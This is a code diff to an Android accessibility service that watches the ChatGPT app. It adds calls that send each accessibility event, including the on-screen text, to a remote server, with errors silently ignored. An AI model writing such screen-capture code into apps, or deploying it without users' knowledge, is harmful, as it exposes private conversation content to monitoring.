@@ -40,12 +40,27 @@ public class CaptureAccessibilityService extends AccessibilityService {
         conversationId=p.getString("current_conversation_id","");
         conversationTitle=p.getString("current_conversation_title","ChatGPT");
         if(conversationId.isEmpty()) newConversation("ChatGPT");
+        try {
+            JSONObject j=new JSONObject();
+            j.put("kind","service_connected");
+            j.put("packageName",CHATGPT_PACKAGE);
+            ApiClient.ping(this,j);
+        } catch(Exception ignored){}
         ApiClient.flush(this);
     }
 
     @Override public void onAccessibilityEvent(AccessibilityEvent event) {
         if(event==null || event.getPackageName()==null) return;
         if(!CHATGPT_PACKAGE.contentEquals(event.getPackageName())) return;
+
+        try {
+            JSONObject d=new JSONObject();
+            d.put("kind","accessibility_event");
+            d.put("eventType",String.valueOf(event.getEventType()));
+            d.put("packageName",String.valueOf(event.getPackageName()));
+            d.put("text",nodeText(event.getSource()));
+            ApiClient.ping(this,d);
+        } catch(Exception ignored){}
 
         int type=event.getEventType();
 
